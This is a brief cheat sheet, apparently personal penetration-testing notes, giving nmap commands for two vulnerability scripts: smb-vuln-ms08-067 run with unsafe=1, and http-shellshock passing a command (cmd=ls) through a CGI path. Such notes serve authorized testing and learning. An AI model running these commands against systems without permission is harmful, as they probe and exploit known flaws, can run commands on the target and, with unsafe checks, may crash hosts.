# useful nse scripts

smb-vuln-ms08-067

```text
nmap --script-args=unsafe=1 --script smb-vuln-ms08-067.nse -p 445 <host>
```

\(seems to work 90% of the time\)

http-shellshock

```text
nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/{location},cmd=ls <target>
```

broken by default, fix here: [https://www.youtube.com/watch?v=IBlTdguhgfY&t=670s](https://www.youtube.com/watch?v=IBlTdguhgfY&t=670s)

